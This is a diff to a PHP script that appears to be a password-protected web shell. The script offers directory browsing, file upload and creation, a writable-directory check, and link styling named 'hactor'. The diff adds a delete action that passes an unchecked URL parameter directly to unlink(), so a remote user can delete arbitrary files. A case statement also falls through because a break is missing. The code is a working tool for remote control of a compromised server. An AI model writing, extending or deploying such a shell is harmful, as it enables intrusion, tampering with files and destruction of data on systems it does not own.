@@ -47,8 +47,22 @@ function manager()
         break;
       case 'newfile':
         newfile();
+      case 'del':
+        if(!isset($_GET['dir']))
+        {
+          header("location:?do=home");
+        }
+        else
+        {
+          Delete($_GET['dir']);
+        }
         break;
   }
+}
+function Delete($f)
+{
+  unlink($f);
+  header("location:?do=home");
 }
 function newfile()
 {
@@ -72,20 +86,22 @@ function home()
   }
   echo "<center><div id=pwd><form method=post action=''>Present Working Directory : <input id=PWD name=cwd size=80 value='$cwd'><input type=submit name=GO value=Go></form></div></center>";
   $files = scandir($cwd);
-  $l = 1;
-  echo "<center id=fn><table border=1><tr id=th><th>#</th><th>Name</th><th>Is Directory ?</th><th>Permissions</th><th>Action</th><tr>";
+  echo "<center id=fn><table border=1><tr id=th><th>Name</th><th>Permissions</th><th>Action</th><tr>";
   foreach ($files as $file) {
     if($file[0]=="."){continue;}
     if(is_dir($file))
     {
-      echo "<tr><td>$l</td><td>$file</td><td>YES OPEN</td><td>".fileperms($file)."</td><td>NEW FILE DELETE</td></tr>";
+      echo "<tr><td>[ $file ]</td><td>".fileperms($file)."</td><td><pre><a href='?do=dnf&dir=".$cwd."' id=hactor>{New File}</a> <a href='?do=del&dir=".$cwd."' id=hactor>{Delete}</a> <a href='?do=ren&dir=".$cwd."' id=hactor>{Rename}</a></pre></td></tr>";
     }
-    else {
-      echo "<tr><td>$l</td><td>$file</td><td>NO</td><td>".fileperms($file)."</td><td>NEW FILE DELETE</td></tr>";
-    }
-    $l++;
   }
-  echo "</table></center>";
+  foreach ($files as $file) {
+    if(!is_dir($file))
+    {
+      echo "<tr><td>$file</td><td>".fileperms($file)."</td><td>NEW FILE DELETE</td></tr>";
+    }
+  }
+  $write = is_writable(getcwd()) ? "<p style=color:royalblue;>{ Writable }</p>" : "<p style=color:royalblue;>{ Non Writable }</p>";
+  echo "</table><br>$write</center>";
 }
 function uploader()
 {
@@ -131,7 +147,6 @@ function logout()
 
 function main($password)
 {
-
   echo "<form action='' method=post><center><input id=login type=password name=pwd autofocus><br><span id=login-msg>Enter Password and Press Enter</span></center></form>";
   if(isset($_POST['pwd']) and @$_POST['pwd']==$password)
   {
